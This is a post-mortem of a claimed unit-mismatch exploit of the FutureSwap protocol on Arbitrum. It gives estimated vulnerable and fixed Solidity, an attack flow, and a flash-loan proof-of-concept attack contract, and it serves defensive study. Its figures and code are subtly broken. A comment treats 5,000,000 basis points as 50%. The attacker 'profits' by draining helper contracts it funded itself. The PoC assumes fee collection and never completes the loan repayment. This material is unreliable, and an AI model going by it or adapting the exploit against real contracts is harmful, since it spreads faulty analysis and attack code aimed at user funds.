# FutureSwap — Unit Mismatch Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-10 |
| **Protocol** | FutureSwap |
| **Chain** | Arbitrum |
| **Loss** | ~$433,000 (USDC.e) |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | FutureSwap FeeManager Contract |
| **Root Cause** | Fees are calculated and passed as token unit amounts, but FeeManager interprets them as basis points (bps), resulting in abnormally large fees being charged |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

FutureSwap is a leverage trading protocol where the `changePosition()` function calculates fees and passes them to the `FeeManager` when a position is modified.

The vulnerability arises from a **unit mismatch** in fee representation:

- `changePosition()` calculates fees as an **absolute token amount** (e.g., 1000 USDC.e = 1000 * 1e6) and passes that value
- `FeeManager` interprets this value as **basis points** (bps, 1/10000)
- Result: 1000 USDC.e → FeeManager interprets as 1000 bps = 10% fee → 10% of the position is deducted as a fee

The attacker set `deltaAsset` to an extremely large value to maximize the computed fee amount, causing FeeManager to interpret it as hundreds of percent in bps, thereby draining victims' USDC.e and WETH.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (Estimated)

```solidity
// ❌ Vulnerable: fee computed as token amount and passed directly to FeeManager
contract FutureSwap {
    IFeeManager public feeManager;

    function changePosition(
        address user,
        int256 deltaAsset,   // position delta
        int256 deltaStable
    ) external {
        // ❌ Fee computed as absolute USDC.e amount (e.g., 5000_000000 = 5000 USDC.e)
        uint256 feeAmount = calculateFee(deltaAsset);  // token units

        // ❌ Token amount passed directly to FeeManager
        //    FeeManager interprets this as basis points!
        feeManager.applyFee(user, feeAmount);
    }

    function calculateFee(int256 deltaAsset) internal view returns (uint256) {
        // Fee proportional to position size (absolute amount)
        return uint256(abs(deltaAsset)) * feeRate / 10000;
    }
}

contract FeeManager {
    function applyFee(address user, uint256 feeBps) external {
        // ❌ feeBps is interpreted as basis points
        // feeBps = 5_000_000 (5000 USDC.e in 6 decimals)
        // → 5000 * 10000 / 10000 = 5000 bps = 50% fee!
        uint256 feePercent = feeBps; // unit: bps (1/10000)
        uint256 deduction = getUserBalance(user) * feePercent / 10000;
        _deductBalance(user, deduction);
    }
}
```

### Fixed Code

```solidity
// ✅ Fixed: explicit unit definitions and conversions
contract FutureSwap {
    IFeeManager public feeManager;
    uint256 constant BPS_DENOMINATOR = 10000;

    function changePosition(
        address user,
        int256 deltaAsset,
        int256 deltaStable
    ) external {
        uint256 positionSize = getPositionSize(user);

        // ✅ Fee computed in basis points (not as absolute amount)
        uint256 feeBps = calculateFeeBps(deltaAsset, positionSize);

        // ✅ FeeManager explicitly receives value in bps
        feeManager.applyFeeBps(user, feeBps);
    }

    function calculateFeeBps(int256 deltaAsset, uint256 positionSize)
        internal view returns (uint256)
    {
        // ✅ bps = (fee_amount / position_size) * 10000
        uint256 rawFee = uint256(abs(deltaAsset)) * feeRate / BPS_DENOMINATOR;
        return rawFee * BPS_DENOMINATOR / positionSize; // normalized to bps
    }
}

contract FeeManager {
    // ✅ Unit explicitly stated in function name
    function applyFeeBps(address user, uint256 feeBps) external {
        require(feeBps <= 1000, "Fee too high"); // ✅ cap at 10% (1000 bps)
        uint256 deduction = getUserBalance(user) * feeBps / 10000;
        _deductBalance(user, deduction);
    }
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Flash loan 500,000 USDC.e from Aave V3
  │
  ├─[2] Deploy helper contracts (set as victim addresses)
  │       Multiple helper contracts created to expand attack surface
  │
  ├─[3] Helper contracts deposit USDC.e + WETH into FutureSwap
  │       Victim positions established
  │
  ├─[4] Call changePosition() with extreme deltaAsset
  │       deltaAsset = very large value (e.g., 10^15)
  │       │
  │       ├─ calculateFee(deltaAsset) executes
  │       │   fee = 10^15 * feeRate / 10000
  │       │   = value equivalent to millions of USDC.e
  │       │
  │       └─ FeeManager.applyFee(victim, feeAmount) called
  │           ⚠️  Unit mismatch: feeAmount interpreted as bps
  │           feePercent = millions of bps → tens of thousands of % fee
  │           Victim balance fully drained!
  │
  ├─[5] Forcibly drain USDC.e + WETH from helper contracts
  │       Balances transferred via excessive fee deduction
  │
  └─[6] Repay Aave V3 flash loan
        Net profit: ~$433,000 USDC.e
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAaveV3Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFutureSwap {
    function changePosition(
        address user,
        int256 deltaAsset,
        int256 deltaStable
    ) external;

    function deposit(uint256 amount) external;
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

// Helper contract used as victim
contract HelperVictim {
    IFutureSwap futureSwap;
    address owner;

    constructor(address _futureSwap) {
        futureSwap = IFutureSwap(_futureSwap);
        owner = msg.sender;
    }

    function depositFunds(address usdce, uint256 amount) external {
        IERC20(usdce).approve(address(futureSwap), amount);
        futureSwap.deposit(amount);
    }

    function withdraw(address token, address to) external {
        require(msg.sender == owner);
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

contract FutureSwapAttack {
    address constant USDC_E = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    IFutureSwap constant futureSwap = IFutureSwap(0x...);
    IAaveV3Pool constant aave = IAaveV3Pool(0x...);

    HelperVictim[] helpers;

    function attack() external {
        // [1] Aave V3 flash loan
        address[] memory assets = new address[](1);
        assets[0] = USDC_E;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 500_000e6;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        // [2] Deploy helper contracts and deposit funds
        for (uint i = 0; i < 5; i++) {
            HelperVictim helper = new HelperVictim(address(futureSwap));
            helpers.push(helper);
            IERC20(USDC_E).transfer(address(helper), amounts[0] / 10);
            helper.depositFunds(USDC_E, amounts[0] / 10);
        }

        // [4] Trigger unit mismatch with extreme deltaAsset
        int256 extremeDelta = int256(10**15);
        for (uint i = 0; i < helpers.length; i++) {
            futureSwap.changePosition(address(helpers[i]), extremeDelta, 0);
            // ⚠️  FeeManager interprets token amount as bps → victim balance fully drained
        }

        // [5] Collect fee proceeds from each helper
        // (assumes fees have been transferred to attacker contract)

        // [6] Repay flash loan
        uint256 repay = amounts[0] + premiums[0];
        IERC20(USDC_E).approve(address(aave), repay);
        return true;
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unit Mismatch |
| **Attack Vector** | Inducing unit confusion via extreme parameter values |
| **Impact Scope** | All victim positions within FutureSwap |
| **DASP Classification** | Business Logic Error / Type Confusion |
| **CWE** | CWE-681: Incorrect Conversion between Numeric Types |
| **Severity** | Critical |

### Detailed Explanation

A unit mismatch vulnerability occurs when two components share an interface but have **mismatched implicit unit assumptions**. Because Solidity's type system cannot express units (`uint256 bps` vs `uint256 tokenAmount`), unit confusion between caller and callee arises unless developers explicitly document units via comments or function names.

This is especially problematic in financial protocols, where fee calculations frequently mix absolute amounts (token amount) with relative ratios (bps, %), demanding extra care.

---

## 6. Remediation Recommendations

1. **Encode units in function/parameter names**: Distinguish with names like `applyFee(bps)`, `applyFeeAmount(tokenAmount)`, etc.
2. **Use type wrappers**: Leverage custom types such as `type Bps is uint256;` for compile-time unit validation
3. **Enforce fee caps**: Validate input ranges with guards like `require(feeBps <= MAX_FEE_BPS)`
4. **Centralize unit conversion logic**: Manage token amount ↔ bps conversion in a single function
5. **Strengthen integration tests**: Validate fee calculation results for extreme inputs (very large `deltaAsset`)
6. **Mandate unit comments in code reviews**: Add unit annotations (wei, USDC, bps, etc.) to all amount variables

---

## 7. Lessons Learned

- **Implicit unit assumptions are fatal**: In Solidity, `uint256` carries no unit information, so units at component interfaces must be explicitly documented and validated.
- **Fee calculations require bidirectional verification**: Both that the sender transmits the correct unit, and that the receiver interprets the correct unit, must be verified.
- **Defending against extreme inputs is essential**: Input bounds must be enforced to prevent the protocol from behaving unexpectedly when values outside the normal range are supplied.
- **Be aware of the victim-creation-via-helper-contract pattern**: Attackers directly instantiating victims and attacking them is difficult to detect through simple analysis, making root-cause fixes at the code level critical.